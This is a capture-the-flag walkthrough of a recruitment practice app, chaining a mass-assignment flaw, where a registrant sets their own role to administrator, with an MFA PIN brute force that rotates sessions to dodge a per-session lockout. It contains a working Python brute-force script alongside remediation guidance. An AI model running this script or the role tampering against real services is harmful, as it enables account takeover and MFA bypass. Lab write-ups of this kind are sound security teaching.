---
layout: post
title:  "BugForge - Weekly - Fur Hire"
date:   2026-02-28 09:00
image:  /images/bug-forge/bugforge-logo.png
tags:   [mass-assignment,privilege-escalation,mfa-brute-force,rate-limit-bypass]
categories: [BugForge,weekly,fur-hire]
---

# Weekly - Fur Hire
><br/><b>Vulnerabilities Covered:</b>
<br/>
Mass Assignment leading to Privilege Escalation
<br/>
MFA Brute Force via Session Rotation (Rate Limit Bypass)
<br/>
<br/>
<b>Summary:</b>
<br/>
This walkthrough demonstrates two chained vulnerabilities in a job recruitment application. The `/api/register` endpoint exposes a `role` parameter that is accepted directly from the client without server-side validation, allowing an attacker to self-assign the `administrator` role at registration time, classic mass assignment vulnerability. After logging in as the newly created administrator, the application presents an MFA challenge requiring a 4-digit numeric OTP. Rate limiting on the MFA verification endpoint is tied to the session rather than the account or OTP itself, and resets upon re-authentication. By exploiting this, all 10,000 possible PINs can be enumerated through session rotation,  re-authenticating after each batch of attempts to reset the lockout counter, until the valid OTP is discovered and the flag is retrieved.
<br/>
<br/>
<b>Reference:</b>
<br/>
<a href="https://app.bugforge.io/">Bugforge.io</a><br/>
<a href="https://tomfieber.github.io/writeups/bugforge/weekly/Fur-Hire-4/">pawpawhacks - Bugforge - Weekly - Fur Hire 4</a>
<br/>
<br/>

## Solution

### Step 1 - Application Analysis

Registering an account as a `Job Seeker`, completing the onboarding form, and landing on the dashboard gives an initial picture of the application flow. The full registration sequence is: the user registers, completes an onboarding form, and is then redirected to the dashboard.

![Job Seeker Registration](/images/bug-forge/weekly/fur-hire/mfa-brute-force/user-register-request.png)

![Registration onboarding process requests](/images/bug-forge/weekly/fur-hire/mfa-brute-force/registration-onboarding-process.png)

Analysing the `/api/register` request reveals that the frontend supplies a `role` parameter as part of the registration payload. This is a significant observation: if the server accepts and trusts this client-supplied value without enforcing role assignment server-side, it may be possible to assign an elevated role directly at registration.

---

### Step 2 - Source Code Analysis & Role Discovery

To identify what role values the application recognises, the dashboard source code was reviewed. The frontend checks for the `administrator` role when determining whether to render privileged UI elements.

![Dashboard code analysis](/images/bug-forge/weekly/fur-hire/mfa-brute-force/dashboard-code-analysis.png)

With the `administrator` role value confirmed, the next step is to test whether the server enforces role assignment or blindly trusts the client-supplied value.

---

### Step 3 - Privilege Escalation via Mass Assignment

Intercepting the registration request and changing the `role` parameter from `job_seeker` to `administrator` submits a modified registration payload directly to the API.

![Malcious Registration Request](/images/bug-forge/weekly/fur-hire/mfa-brute-force/malicious-registration-request.png)

![Malcious Registration Response](/images/bug-forge/weekly/fur-hire/mfa-brute-force/malicious-registration-response.png)

The server accepts the request and creates the account with the `administrator` role. Confirming the mass assignment vulnerability. The application does not validate or restrict which role values a client may specify during registration.

---

### Step 4 - MFA Challenge Analysis

Logging in with the newly created administrator credentials, the application presents an MFA page requiring a 4-digit PIN before granting access to the dashboard.

To understand the MFA behaviour, a random 4-digit code was submitted and the request captured. This gives the structure of the `/api/mfa/verify` endpoint and confirms it accepts a `pin` parameter in the request body.

The next question is whether any lockout or rate limiting exists that would prevent brute-forcing the PIN space.

---

### Step 5 - Testing Rate Limiting Behaviour

![Caido Automate to test lockout](/images/bug-forge/weekly/fur-hire/mfa-brute-force/lockout-mfa-automation.png)

Automating rapid PIN submissions revealed that the application enforces a lockout after approximately 15 failed attempts. Critically, the lockout is tied to the session rather than the account. Logging out and logging back in issues a fresh session and resets the attempt counter.

Additionally, the OTP is not bound to the session; it persists across re-authentication. This means a new session can continue brute-forcing from where the previous session left off, without the OTP changing. Together, these two behaviours make full PIN enumeration feasible by rotating sessions after every batch of attempts.

---

### Step 6 - MFA Brute Force via Session Rotation

With the exploitation strategy confirmed, a script was written to automate the full brute-force. It logs in to obtain a fresh session, submits a batch of 10 PIN attempts (staying safely under the 15-attempt lockout threshold), then re-authenticates and continues. Once the valid PIN is found, the script calls the admin content endpoint and extracts the flag.

After reviewing [pawpawhacks](https://tomfieber.github.io/writeups/bugforge/weekly/Fur-Hire-4/) writeup, the flag extraction step was added to the original script to pull the flag directly from the `/api/admin/content` response.

```python
import requests
import urllib3
import argparse
import time
import re

urllib3.disable_warnings()

parser = argparse.ArgumentParser(description="MFA PIN brute-force via session rotation")
parser.add_argument("-t", "--target", required=True, help="Target host URL")
parser.add_argument("-u", "--username", required=True, help="Username")
parser.add_argument("-p", "--password", required=True, help="Password")
parser.add_argument("-b", "--batch", type=int, default=10, help="Attempts per session (default: 10)")
args = parser.parse_args()

session = requests.Session()
FLAG_PATTERN = re.compile(r"bug\{[^}]+\}")

def login():
    r = session.post(f"{args.target}/api/login",
                     json={"username": args.username, "password": args.password},
                     verify=False, timeout=15)
    if r.status_code == 200:
        token = r.json().get("token")
        session.headers.update({"Authorization": f"Bearer {token}"})
        print(f"[+] Logged in")
        return token
    else:
        print(f"[-] Login failed: {r.status_code}")
        return None

def fetch_flag():
    r = session.get(f"{args.target}/api/admin/content", verify=False, timeout=15)
    match = FLAG_PATTERN.search(r.text)
    if match:
        print(f"\n[!!!] FLAG: {match.group(0)}")
    else:
        print(f"[-] No flag found in response: {r.text[:200]}")

code_num = 0

while code_num <= 9999:
    token = login()
    if not token:
        print("[!] Login failed. Retrying...")
        time.sleep(2)
        continue

    for _ in range(args.batch):
        if code_num > 9999:
            break
        pin = f"{code_num:04d}"
        r = session.post(f"{args.target}/api/mfa/verify",
                         json={"pin": pin}, verify=False, timeout=15)

        if r.status_code == 200:
            print(f"\n[!!!] VALID PIN: {pin}")
            fetch_flag()
            exit()
        else:
            print(f"PIN {pin} -> {r.status_code}")

        code_num += 1

    time.sleep(0.5)

print("[-] All PINs exhausted")
```

![Flag](/images/bug-forge/weekly/fur-hire/mfa-brute-force/flag.png)

---

### Impact

- Full administrator account creation by any unauthenticated user, granting access to privileged functionality
- Complete bypass of MFA through exhaustive PIN enumeration, undermining the second authentication factor entirely
- Unrestricted access to the administrator dashboard and any sensitive data or actions it exposes
- Session-based rate limiting provides no meaningful protection against an attacker who can re-authenticate freely
- Demonstrates how two individually low-complexity weaknesses. Trusting client-supplied role values and session-scoped lockouts, chain together into a full authentication bypass

---

### Vulnerability Classification

**Mass Assignment**
- **OWASP Top 10:** A01:2021 - Broken Access Control
- **Vulnerability Type:** Mass Assignment / Client-Side Role Manipulation
- **Attack Surface:** `/api/register`: `role` parameter accepted from client without server-side enforcement
- **CWE:**
  - CWE-915 - Improperly Controlled Modification of Dynamically-Determined Object Attributes
  - CWE-639 - Authorization Bypass Through User-Controlled Key

**MFA Brute Force**
- **OWASP Top 10:** A07:2021 - Identification and Authentication Failures
- **Vulnerability Type:** MFA Brute Force via Session Rotation (Rate Limit Bypass)
- **Attack Surface:** `/api/mfa/verify` `pin` parameter; session-scoped lockout counter
- **CWE:**
  - CWE-307 - Improper Restriction of Excessive Authentication Attempts
  - CWE-799 - Improper Control of Interaction Frequency
  - CWE-262 - Not Using Password Aging (analogous: OTP not invalidated or rotated across sessions)

---

### Root Cause

**Mass Assignment:** The `/api/register` endpoint accepts and persists the `role` field directly from the client-supplied request body without validating it against a server-side allowlist or enforcing a default safe value. Role assignment should be a server-side concern. The application should ignore any `role` value supplied by the client and instead assign roles based on business logic alone (e.g., all self-registered users receive the `job_seeker` role by default, with elevation only possible through a controlled administrative process).

**MFA Brute Force:** The application's lockout mechanism tracks failed MFA attempts at the session level, meaning the counter is discarded when the session ends. Because the OTP is also not tied to the session. It remains valid across re-authentication, an attacker can log in, exhaust the per-session attempt budget, log out to reset the counter, log back in, and continue enumerating from where they left off. Full enumeration of the 10,000-PIN space (0000–9999) is therefore possible with at most 1,000 session rotations.

---

### Remediation

**Mass Assignment:**
- Strip or ignore client-supplied `role`, `admin`, and other privilege-related fields in registration and profile update endpoints on the server side
- Assign roles exclusively through server-side business logic, never from client input
- Apply a strict allowlist of accepted fields for each API endpoint using an input validation layer or DTO mapping
- Audit all object-binding and deserialization paths for similar mass assignment exposure

**MFA Brute Force:**
- Enforce rate limiting and lockout at the account level rather than the session level, so that re-authentication does not reset the attempt counter
- Bind the OTP to the session so that a new login generates a new OTP, invalidating any ongoing brute-force attempts
- Implement exponential back-off or a hard account lock after a defined number of failed MFA attempts, requiring manual unlock or out-of-band recovery
- Consider time-based OTPs (TOTP) rather than static server-generated PINs, as they expire after a short window and dramatically reduce the brute-force window
- Alert on unusually high rates of MFA failures for a given account as a detection signal

---
